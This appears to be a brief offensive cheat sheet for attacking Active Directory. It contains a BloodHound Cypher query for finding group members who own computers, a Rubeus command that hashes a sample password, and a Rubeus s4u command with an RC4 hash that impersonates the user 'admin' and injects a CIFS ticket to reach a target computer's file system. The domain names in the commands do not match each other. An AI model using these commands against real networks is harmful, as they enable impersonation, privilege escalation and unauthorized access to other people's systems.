# bloodhound-queries

```
MATCH(((u1:User)-[r1:MemberOf*1..]->(g1:Group))) MATCH p2=(u1)-[:Owns*1..]->(c:Computer) RETURN p2

Rubeus.exe hash /password:Summer2018!

Use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:

Rubeus.exe s4u /user:FAKECOMPUTER.ADVS.AIDVANTAGE.COM$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
```
